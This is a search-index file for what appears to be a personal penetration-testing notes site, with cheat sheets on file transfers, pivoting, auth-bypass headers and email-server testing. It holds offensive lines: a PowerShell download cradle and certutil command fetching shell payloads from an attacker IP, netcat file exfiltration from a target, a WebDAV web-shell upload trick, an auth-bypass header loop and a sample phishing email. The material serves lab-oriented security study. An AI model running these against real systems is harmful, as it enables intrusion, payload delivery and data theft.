{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs For full documentation visit mkdocs.org . Commands mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. Test Edit This is a test edit So is this... Testing Testing 1,2,3","title":"Welcome to MkDocs"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"#test-edit","text":"This is a test edit So is this...","title":"Test Edit"},{"location":"#testing-testing-123","text":"","title":"Testing Testing 1,2,3"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/","text":"File Transfers 101 There is more than one way to skin a cat, and there is more than one way to transfer a file. Just because one method doesn't work, doens't mean another one won't. Try Harder\u2122 Hasing and Verifying Files Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker. # Read a file cat /path/to/file # Read the file headers xxd /path/to/file | head -c 1024 # Have Linux guess at the file type (from the file header) file /path/to/file # Get a SHA256 hash sha265sum /path/to/file # Get an MD5 hash md5sum /path/to/file One file > Many files If it's possible, archive whatever it is you need to upload/download. Sometimes it's not really feasible but it's something that should be considered, for multiple reasons. It's a smaller file It won't match any stored file hashes if your adversary uses such monitoring One file is easier to transfer than 10 You can serialize the contents of an archive for text based extraction if that's all you have # Create a new tarball tar czvf NameOfTarBall.tgz /path/to/archive # Extract tarball tar xvf NameOfTarBall.tgz # Serialize a tarball cat NameOfTarBall.tgz | base64 -w 0 # Recover tarball from serialized data echo \"<BASE64_STRING>\" | base64 -d > recovered.tgz BASH (command line tools) wget <path to file> -O <filename> curl <path to file> --output <filename> # Copy a file from a target to our host scp user@host:/path/to/file /path/to/destination # Copy a file from our host to a target scp /path/to/file user@host:/path/to/destination # Copy a whole directory from our host to a target scp -r /path/to/directory user@host:/path/to/destination We can use a netcat listener and STDOUT to write raw input to files: # setup a listener where \"someFile\" is the file you want to write # this will sit and wait for the connection, so set it up first nc -lvnp 1337 > someFile # On the target nc 10.10.14.4 1337 < someFile You'll have no real way to tell when the transfer is done using the above nc method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run file and/or sha256sum to verify the integrity of the file (it can get trashed using this method) FTP Connect ftp domain.com ftp 192.168.0.1 ftp user@ftpdomain.com Log in Name: anonymous Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> Move around ftp> ls ftp> cd directory Grab files get file Send files put file Python With Requests pip install requests import requests url = 'https://www.python.org/static/img/python-logo@2x.png' myfile = requests.get(url) open('/path/to/save/image.png', 'wb').write(myfile.content) With wget pip install wget import wget url = \"https://www.python.org/static/img/python-logo@2x.png\" wget.download(url, '/path/to/save/image.png') With urllib should already be installed, but... pip install urllib urllib.request.urlretrieve('url', 'path') With urllib3 pip install urllib3 import urllib3, shutil url = 'https://www.python.org/' c = urllib3.PoolManager() filename = \"test.txt\" with c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file: shutil.copyfileobj(res, out_file) Powershell In-memory download cradle handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1') Standard Web Request iwr \u2018http://10.10.14.4/shell.ps1\u2019 -Outfile C:\\Windows\\temp\\shell.ps1 Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\\Windows\\temp\\shell.ps1 SMB Standard SMB Modify /etc/samba/smbd.conf. Add the following to the bottom: [global] workgroup = WORKGROUP server string = Samba Server %v netbios name = tengu security = user map to guest = bad user name resolve order = bcast host dns proxy = no bind interfaces only = yes [gorilla] path = /var/www/html/pub writable = no guest ok = yes guest only = yes read only = yes directory mode = 0555 force user = nobody Set folder permissions chmod 0555 /var/www/html/pub chown -R nobody:nogroup /var/www/html/pub Restart Samba service smbd start service smdb stop service smbd restart Monitor logs for errors tail -f /var/log/samba/log.<site-name> Impacket SMB impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub Then use \\\\10.10.14.4\\bullsec\\<file-name> as the location to send your file from, or to have the target grab from you. Mounting a remote share is pretty simple as well assuming you know the name of the share: mkdir /mnt/10.10.10.123 mount -t cifs //10.10.10.123/general /mnt/10.10.10.123 Now we can browse the share inside our terminal. Impacket SMB w/ Password # Create the SMB Share impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword # Create a Credential Object $pass = convertto-securestring 'SecurePassword' -asplain -force $cred = new-object system.management.automation.pscredential(\"htb\\bullsec\", $pass) # Connect to the Share New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\\\10.10.14.3\\bullShare # Browse the Share cd bullShare: certutil Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target: certutil -urlcache -f \u201chttp://10.10.14.14/shell.exe\u201d shell.exe That's it really. It might not always be a thing, but on older Windows machines it should be present. TFTP Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP. service atftpd start On Kali by default TFTP is configured from the following location: /etc/default/atftpd And it serves files (by default) from: /srv/tftp To download files from a server we can do: tftp -i host GET C:%homepath%file location_of_file_on_tftp_server And to upload a file to the server we can do: tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server SFTP How To Use SFTP to Securely Transfer Files with a Remote Server VisualBasic If push comes to shove, we can use something like the following: Set args = Wscript.Arguments Url = \"http://domain/file\" dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\") dim bStrm: Set bStrm = createobject(\"Adodb.Stream\") xHttp.Open \"GET\", Url, False xHttp.Send with bStrm .type = 1 ' .open .write xHttp.responseBody .savetofile \" C:%homepath%file\", 2 ' end with WebDAV We can sometimes use WebDAV to upload files to a system. If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension. $> cadaver http://192.168.56.5 put shell.jsp.txt mv shell.jsp.txt shell.jsp","title":"File Transfers 101"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#file-transfers-101","text":"There is more than one way to skin a cat, and there is more than one way to transfer a file. Just because one method doesn't work, doens't mean another one won't. Try Harder\u2122","title":"File Transfers 101"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#hasing-and-verifying-files","text":"Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker. # Read a file cat /path/to/file # Read the file headers xxd /path/to/file | head -c 1024 # Have Linux guess at the file type (from the file header) file /path/to/file # Get a SHA256 hash sha265sum /path/to/file # Get an MD5 hash md5sum /path/to/file","title":"Hasing and Verifying Files"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#one-file-many-files","text":"If it's possible, archive whatever it is you need to upload/download. Sometimes it's not really feasible but it's something that should be considered, for multiple reasons. It's a smaller file It won't match any stored file hashes if your adversary uses such monitoring One file is easier to transfer than 10 You can serialize the contents of an archive for text based extraction if that's all you have # Create a new tarball tar czvf NameOfTarBall.tgz /path/to/archive # Extract tarball tar xvf NameOfTarBall.tgz # Serialize a tarball cat NameOfTarBall.tgz | base64 -w 0 # Recover tarball from serialized data echo \"<BASE64_STRING>\" | base64 -d > recovered.tgz","title":"One file &gt; Many files"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#bash-command-line-tools","text":"wget <path to file> -O <filename> curl <path to file> --output <filename> # Copy a file from a target to our host scp user@host:/path/to/file /path/to/destination # Copy a file from our host to a target scp /path/to/file user@host:/path/to/destination # Copy a whole directory from our host to a target scp -r /path/to/directory user@host:/path/to/destination We can use a netcat listener and STDOUT to write raw input to files: # setup a listener where \"someFile\" is the file you want to write # this will sit and wait for the connection, so set it up first nc -lvnp 1337 > someFile # On the target nc 10.10.14.4 1337 < someFile You'll have no real way to tell when the transfer is done using the above nc method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run file and/or sha256sum to verify the integrity of the file (it can get trashed using this method)","title":"BASH (command line tools)"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#ftp","text":"","title":"FTP"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#connect","text":"ftp domain.com ftp 192.168.0.1 ftp user@ftpdomain.com","title":"Connect"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#log-in","text":"Name: anonymous Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp>","title":"Log in"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#move-around","text":"ftp> ls ftp> cd directory","title":"Move around"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#grab-files","text":"get file","title":"Grab files"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#send-files","text":"put file","title":"Send files"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#python","text":"","title":"Python"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-requests","text":"pip install requests import requests url = 'https://www.python.org/static/img/python-logo@2x.png' myfile = requests.get(url) open('/path/to/save/image.png', 'wb').write(myfile.content)","title":"With Requests"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-wget","text":"pip install wget import wget url = \"https://www.python.org/static/img/python-logo@2x.png\" wget.download(url, '/path/to/save/image.png')","title":"With wget"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-urllib","text":"should already be installed, but... pip install urllib urllib.request.urlretrieve('url', 'path') With urllib3 pip install urllib3 import urllib3, shutil url = 'https://www.python.org/' c = urllib3.PoolManager() filename = \"test.txt\" with c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file: shutil.copyfileobj(res, out_file)","title":"With urllib"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#powershell","text":"In-memory download cradle handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1')","title":"Powershell"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#standard-web-request","text":"iwr \u2018http://10.10.14.4/shell.ps1\u2019 -Outfile C:\\Windows\\temp\\shell.ps1 Invoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\\Windows\\temp\\shell.ps1","title":"Standard Web Request"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#smb","text":"","title":"SMB"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#standard-smb","text":"Modify /etc/samba/smbd.conf. Add the following to the bottom: [global] workgroup = WORKGROUP server string = Samba Server %v netbios name = tengu security = user map to guest = bad user name resolve order = bcast host dns proxy = no bind interfaces only = yes [gorilla] path = /var/www/html/pub writable = no guest ok = yes guest only = yes read only = yes directory mode = 0555 force user = nobody","title":"Standard SMB"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#set-folder-permissions","text":"chmod 0555 /var/www/html/pub chown -R nobody:nogroup /var/www/html/pub","title":"Set folder permissions"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#restart-samba","text":"service smbd start service smdb stop service smbd restart","title":"Restart Samba"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#monitor-logs-for-errors","text":"tail -f /var/log/samba/log.<site-name>","title":"Monitor logs for errors"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#impacket-smb","text":"impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub Then use \\\\10.10.14.4\\bullsec\\<file-name> as the location to send your file from, or to have the target grab from you. Mounting a remote share is pretty simple as well assuming you know the name of the share: mkdir /mnt/10.10.10.123 mount -t cifs //10.10.10.123/general /mnt/10.10.10.123 Now we can browse the share inside our terminal.","title":"Impacket SMB"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#impacket-smb-w-password","text":"# Create the SMB Share impacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword # Create a Credential Object $pass = convertto-securestring 'SecurePassword' -asplain -force $cred = new-object system.management.automation.pscredential(\"htb\\bullsec\", $pass) # Connect to the Share New-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\\\10.10.14.3\\bullShare # Browse the Share cd bullShare:","title":"Impacket SMB w/ Password"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#certutil","text":"Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target: certutil -urlcache -f \u201chttp://10.10.14.14/shell.exe\u201d shell.exe That's it really. It might not always be a thing, but on older Windows machines it should be present.","title":"certutil"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#tftp","text":"Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP. service atftpd start On Kali by default TFTP is configured from the following location: /etc/default/atftpd And it serves files (by default) from: /srv/tftp To download files from a server we can do: tftp -i host GET C:%homepath%file location_of_file_on_tftp_server And to upload a file to the server we can do: tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server","title":"TFTP"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#sftp","text":"How To Use SFTP to Securely Transfer Files with a Remote Server","title":"SFTP"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#visualbasic","text":"If push comes to shove, we can use something like the following: Set args = Wscript.Arguments Url = \"http://domain/file\" dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\") dim bStrm: Set bStrm = createobject(\"Adodb.Stream\") xHttp.Open \"GET\", Url, False xHttp.Send with bStrm .type = 1 ' .open .write xHttp.responseBody .savetofile \" C:%homepath%file\", 2 ' end with","title":"VisualBasic"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#webdav","text":"We can sometimes use WebDAV to upload files to a system. If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension. $> cadaver http://192.168.56.5 put shell.jsp.txt mv shell.jsp.txt shell.jsp","title":"WebDAV"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/","text":"Pivoting & Lateral Movement Sometimes we just can't get access to the thing that we need to exploit. When that happens we need to know the different ways in which we can get around this little hurdle, as there is always a way. The question on StackExchange that spawned this post SOCAT socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000 Python Not something you want to code yourself with any kind of time contraints, but it's totally possible. Best choice is to use an existing library like sshtunnel which you can use to do things like the following (which forwards a Vagrant server to the local MySQL port): from sshtunnel import open_tunnel from time import sleep with open_tunnel( ('localhost', 2222), ssh_username=\"vagrant\", ssh_password=\"vagrant\", remote_bind_address=('127.0.0.1', 3306) ) as server: print(server.local_bind_port) while True: # press Ctrl-C for stopping sleep(1) print('FINISH!') Putty Basically SSH for Windows. Usually the most interaction we'll have with this is when we find one of it's keys (.ppk) laying around on a machine. With that being said... Convert Putty key to SSH key: puttygen id_dsa.ppk -O private-openssh -o id_dsa puttygen id_dsa.ppk -O public-openssh -o id_dsa.pub Sometimes Putty also has passwords left in the registry: Plink For this to work we need to make sure SSH is turned on. service ssh restart The on the target machine we can do the following: .\\plink.exe root@kali_ip -R KALI_PORT:IP_OF_TARGET_MACHINE:TARGET_PORT (Could come in handy if we have SMB creds for an admin but we can't access SMB remotely) Metasploit In a meterpreter session: portfwd add -l LOCAL_PORT -p DESTINATION_PORT -r TARGET_IP run autoroute -s 10.1.1.0/24 run autoroute -s 10.2.2.0/24 use auxiliary/server/socks4a set SRVHOST 127.0.0.1 exploit -j Now on our host machine we can scan the IT network: vim /etc/proxychains.conf ... socks4 127.0.0.1 1080 proxychains nmap -sT -v -Pn 10.2.2.224 Chisel Chisel is an awesome tool that is more than capable of turning what feels like a lost cause into a system own. Github Link for Chisel On the host: chisel(.exe) client 10.10.14.3:1338 R:1234:127.0.0.1:1234 That will setup a connection to 1337, which will then forward port 1234 to localhost: chisel(.exe) server -p 1337 -reverse -v SSH Local Foward: ssh -L 80:127.0.0.1:80 someserver@someip Remote Forward ssh -R 8080:localhost:80 someserver@someip Dynamic tunneling ssh -D 9000 sean@10.11.1.251 vim /etc/proxychains.conf socks4 127.0.0.1 1080 proxychains nmap -sT -v -Pn 10.2.2.224 This creates a dynamic tunnel over port 9000 using SOCKS(4a)","title":"Pivoting & Lateral Movement"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#pivoting-lateral-movement","text":"Sometimes we just can't get access to the thing that we need to exploit. When that happens we need to know the different ways in which we can get around this little hurdle, as there is always a way. The question on StackExchange that spawned this post","title":"Pivoting &amp; Lateral Movement"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#socat","text":"socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000","title":"SOCAT"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#python","text":"Not something you want to code yourself with any kind of time contraints, but it's totally possible. Best choice is to use an existing library like sshtunnel which you can use to do things like the following (which forwards a Vagrant server to the local MySQL port): from sshtunnel import open_tunnel from time import sleep with open_tunnel( ('localhost', 2222), ssh_username=\"vagrant\", ssh_password=\"vagrant\", remote_bind_address=('127.0.0.1', 3306) ) as server: print(server.local_bind_port) while True: # press Ctrl-C for stopping sleep(1) print('FINISH!')","title":"Python"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#putty","text":"Basically SSH for Windows. Usually the most interaction we'll have with this is when we find one of it's keys (.ppk) laying around on a machine. With that being said... Convert Putty key to SSH key: puttygen id_dsa.ppk -O private-openssh -o id_dsa puttygen id_dsa.ppk -O public-openssh -o id_dsa.pub Sometimes Putty also has passwords left in the registry:","title":"Putty"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#plink","text":"For this to work we need to make sure SSH is turned on. service ssh restart The on the target machine we can do the following: .\\plink.exe root@kali_ip -R KALI_PORT:IP_OF_TARGET_MACHINE:TARGET_PORT (Could come in handy if we have SMB creds for an admin but we can't access SMB remotely)","title":"Plink"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#metasploit","text":"In a meterpreter session: portfwd add -l LOCAL_PORT -p DESTINATION_PORT -r TARGET_IP run autoroute -s 10.1.1.0/24 run autoroute -s 10.2.2.0/24 use auxiliary/server/socks4a set SRVHOST 127.0.0.1 exploit -j Now on our host machine we can scan the IT network: vim /etc/proxychains.conf ... socks4 127.0.0.1 1080 proxychains nmap -sT -v -Pn 10.2.2.224","title":"Metasploit"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#chisel","text":"Chisel is an awesome tool that is more than capable of turning what feels like a lost cause into a system own. Github Link for Chisel On the host: chisel(.exe) client 10.10.14.3:1338 R:1234:127.0.0.1:1234 That will setup a connection to 1337, which will then forward port 1234 to localhost: chisel(.exe) server -p 1337 -reverse -v","title":"Chisel"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#ssh","text":"Local Foward: ssh -L 80:127.0.0.1:80 someserver@someip","title":"SSH"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#remote-forward","text":"ssh -R 8080:localhost:80 someserver@someip","title":"Remote Forward"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#dynamic-tunneling","text":"ssh -D 9000 sean@10.11.1.251 vim /etc/proxychains.conf socks4 127.0.0.1 1080 proxychains nmap -sT -v -Pn 10.2.2.224 This creates a dynamic tunnel over port 9000 using SOCKS(4a)","title":"Dynamic tunneling"},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/","text":"Auth Bypass Headers\" Adapted from this tweet: I have found multiple auth bypass issues using below Headers #bugbountytips #bugbounty pic.twitter.com/R82TXWiyDX \u2014 \u00af\\_(\u30c4)_/\u00af85 (@BountyOverflow) August 6, 2022 The following headers can potentially be used to bypass authentication on a webserver. X-Forwarded: 127.0.0.1 X-Forwarded-By: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-For-Original: 127.0.0.1 X-Forwarder-For: 127.0.0.1 X-Forward-For: 127.0.0.1 Forwarded-For: 127.0.0.1 Forwarded-For-Ip: 127.0.0.1 X-Custom-IP-Authorization: 127.0.0.1 X-Originating-Ip: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Trusted-IP: 127.0.0.1 X-Requested-By: 127.0.0.1 X-Requested-For: 127.0.0.1 Example Usage Scenario: You try to access /login and get a custom 401 response that says something like: IP not on Whitelist! (not a likely response but serves as an example) You'd then try and send the following request: GET /login HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT) Host: bullsec.xyz Accept-Language: en-us Accept-Encoding: gzip, deflate Connection: Keep-Alive X-Forwarded-For: 127.0.0.1 That endpoint doesn't exist on this site this is not a lab. {: .prompt-warning} The idea is that the webserver will parse the X-Forwarded-For header and assume that the request has been forwarded to it on behalf of 127.0.0.1 / localhost and let you access the \"Blocked\" /login endpoint. Automation Block X-Forwarded: 127.0.0.1 X-Forwarded-By: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-For-Original: 127.0.0.1 X-Forwarder-For: 127.0.0.1 X-Forward-For: 127.0.0.1 Forwarded-For: 127.0.0.1 Forwarded-For-Ip: 127.0.0.1 X-Custom-IP-Authorization: 127.0.0.1 X-Originating-Ip: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Trusted-IP: 127.0.0.1 X-Requested-By: 127.0.0.1 X-Requested-For: 127.0.0.1 Copy the above into a text file TARGET=<target-ip-address> for x in $(cat headers.txt);do curl -v $TARGET -H \"$x\" ; done That's your lot. Enjoy,","title":"Auth Bypass Headers\""},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/#auth-bypass-headers","text":"Adapted from this tweet: I have found multiple auth bypass issues using below Headers #bugbountytips #bugbounty pic.twitter.com/R82TXWiyDX \u2014 \u00af\\_(\u30c4)_/\u00af85 (@BountyOverflow) August 6, 2022 The following headers can potentially be used to bypass authentication on a webserver. X-Forwarded: 127.0.0.1 X-Forwarded-By: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-For-Original: 127.0.0.1 X-Forwarder-For: 127.0.0.1 X-Forward-For: 127.0.0.1 Forwarded-For: 127.0.0.1 Forwarded-For-Ip: 127.0.0.1 X-Custom-IP-Authorization: 127.0.0.1 X-Originating-Ip: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Trusted-IP: 127.0.0.1 X-Requested-By: 127.0.0.1 X-Requested-For: 127.0.0.1","title":"Auth Bypass Headers\""},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/#example-usage","text":"Scenario: You try to access /login and get a custom 401 response that says something like: IP not on Whitelist! (not a likely response but serves as an example) You'd then try and send the following request: GET /login HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT) Host: bullsec.xyz Accept-Language: en-us Accept-Encoding: gzip, deflate Connection: Keep-Alive X-Forwarded-For: 127.0.0.1 That endpoint doesn't exist on this site this is not a lab. {: .prompt-warning} The idea is that the webserver will parse the X-Forwarded-For header and assume that the request has been forwarded to it on behalf of 127.0.0.1 / localhost and let you access the \"Blocked\" /login endpoint.","title":"Example Usage"},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/#automation-block","text":"X-Forwarded: 127.0.0.1 X-Forwarded-By: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Forwarded-For-Original: 127.0.0.1 X-Forwarder-For: 127.0.0.1 X-Forward-For: 127.0.0.1 Forwarded-For: 127.0.0.1 Forwarded-For-Ip: 127.0.0.1 X-Custom-IP-Authorization: 127.0.0.1 X-Originating-Ip: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Trusted-IP: 127.0.0.1 X-Requested-By: 127.0.0.1 X-Requested-For: 127.0.0.1 Copy the above into a text file TARGET=<target-ip-address> for x in $(cat headers.txt);do curl -v $TARGET -H \"$x\" ; done That's your lot. Enjoy,","title":"Automation Block"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/","text":"Email Pentesting Email servers are complex beasts, if you've ever tried to configure one then you'll know the pain they can cause. With this in mind it's quite common to find them misconfigured in some way that we can take advantage of. For the purpose of this we'll make use of the following clipped nmap scan of an email server from HackTheBox as our reference point as it looks to be a pretty typical example of what you might find in the wild or on a corporate network. 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp syn-ack ttl 63 Postfix smtpd 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) 110/tcp open pop3 syn-ack ttl 63 Dovecot pop3d 143/tcp open imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 993/tcp open ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 995/tcp open ssl/pop3 syn-ack ttl 63 Dovecot pop3d This will be explained in greater detail below, but the above example is a fairly standard mail server, you've got your SMTP daemon (Postfix) running to send mails, and you've also got something to retreive the mails, in this case we have Dovecot running both POP3 and IMAP daemons in SSL and non-SSL mode (that's 4 separate services for the purposes of enumeration). And your common or garden SSH port running on 22, just for completeness, which is generally how the administrator will access this machine. Take your time with email servers, aside from all the information they can give us there can often be vulnerabilities in the services themselves which can be exploited by interacting with them. Make sure to grab proper versions where possible to help with further enumeration. {: .prompt-info } Understanding Email Before we can attack something we need to at least have an understanding of what it is. Email, or electronic mail is a terrible form of communication favoured by managers and the guy in the office who refuses to join Slack because it doesn't fit into his \"Workflow\". But it can still be useful for phishing and otherwise abusing to gain access to systems. Mail is a simple thing, you send mails to a server and someone uses a client to access those emails. In the case of Outlook or something like that they are constantly polling the server and will download new mails when they arrive directly to your local machine, otherwise it would be a manual process (remember having to hit \"Send/Receive\" to get Outlook to send your mail back in the day?) There are a few protocols we need to be familiar with to be able to properly interact with the email server. *We use telnet as it seems to handle the process a bit better than nc , though nc can do the job {: .prompt-info } POP3 The \"Post Office Protocol\", or POP3 as it's generally called. As the name might suggest this is the protocol responsible for actually delivering the mails to users. POP3 servers communicate with the other mail protocols and essentially serve as your mailbox, you can log into the POP3 server (typically running on 110, and 995 in the SSL instance) and download your mail to your local machine or just view it on the server. IMAP Another way of retreiving your mail, but it's much more suited to a larger environment as it handles multiple clients accessing the service simultaneously. By default IMAP runs on ports 143 and 993 respective of if it's using SSL or not with the latter (995) being the one running on SSL. IMAP is the most common protocol for mail access alongside POP3. SMTP Simple Mail Transport Protocol, or SMTP is the defacto standard for sending emails. And it's what we'll be using for most of our testing as we can interact with the protocol via telnet * from our Kali machine. Typically SMTP runs on port 25, with the secure version running on port 465 by default. STMP Command Cheat Sheet Command Description HELO Basic server greeting (older systems) ELHO Enhanced server greeting (newer systems) MAIL FROM Who the mail is from (can be easily spoofed) RCPT TO Who to send the mail to? user@email.address SIZE Because size matters DATA The actual body/content of the message we want to send VRFY Verify that there is a valid user to receive an email (useful!) TURN Invert the client/server relationship without spawning a new connection AUTH For when we need to actually log in RSET Essentially a \"Cancel\" button, closes current action without terminating connection HELP DON'T PANIC! QUIT Because this has all just become a bit too much POP3 Command Cheat Sheet USER <username> PASS <password> STAT LIST RETR DELE RSET TOP QUIT POP3 is a simple beast and will only ever reply in one of the following ways: +OK -ERR Sending Emails Before we can start hacking email servers we need to know the basic protocol for sending and interacting with them. Sending Someone a Mail SMTP $> telnet 10.10.10.110 110 <SERVER BANNER GOES HERE> <Probably something about the creator> > HELO hacker@fakedomain.com OK > MAIL FROM: hacker@fakedomain.com OK > RCPT TO: someone@gullible.com OK > DATA <A message about how to end the mail, usually a \".\" on its own line> Dear Mr Guillible, We are writing to you today as our records show that you are known to respond to random unsolicited emails asking to hand over your information. Could you kindly send us you 16 digit card number and the 3 digit security code off the back of the credit card with the most money on it to the following email address: stealing@allthethings.com . <Confirmation message> > QUIT <closing connection> $> Reading Someones Mail POP3 $> telnet 10.10.10.110 25 <SERVER BANNER GOES HERE> <Probably something about the creator> USER someusername +OK PASS somepassword +OK Mailbox open, 200 messages LIST +OK Mailbox scan listing follows 1 1823 2 1825 3 1819 RETR 1 +OK 1823 octets --- MESSAGE CONTENT GOES HERE --- Harvesting Users The biggest problem you're going to have with testing an email server is figuring out who to target. The best place to get that sort of information would be the company website or ideally dump their entire AD listing of active users... but since we probably don't have access to the latter we'll have to make do with the former and try and scrape as much information as we can from a website or FTP server, or whatever else we can get our grubby paws on. This writeup isn't supposed to be an OSINT primer, but that's kind of where you should be looking for more information on how to gather the kind of information that would be useful for this (emails and Names) As well as names of potential people, we can also look at potential names for departments or teams as these will often have a shared mailbox even in small organisations. Mutations Again this isn't what we're really here to discuss, but one of the things you need to bear in mind is all the potential ways a persons name could end up as a username. Take the simple and common English name David Smith as an example. davidsmith david.smith dsmith d.smith smithd smith.d smith.david smithdavid That's one simple name and I've not even covered all of the possible mutations, we've not even covered the case if there are multiple people with that name, do they get numbers? There is no simple answer here unfortunately, although a pretty good one to test early is david.smith as that seems to be a pretty common one in most enterprises I've seen. Useful Tools Your eyes (Voted #1 Most Useful Tool 2021) Screenshot tools like eyewitness cewl for scraping all of the words from a site/page My Password Generation CheatSheet could also be useful for generating 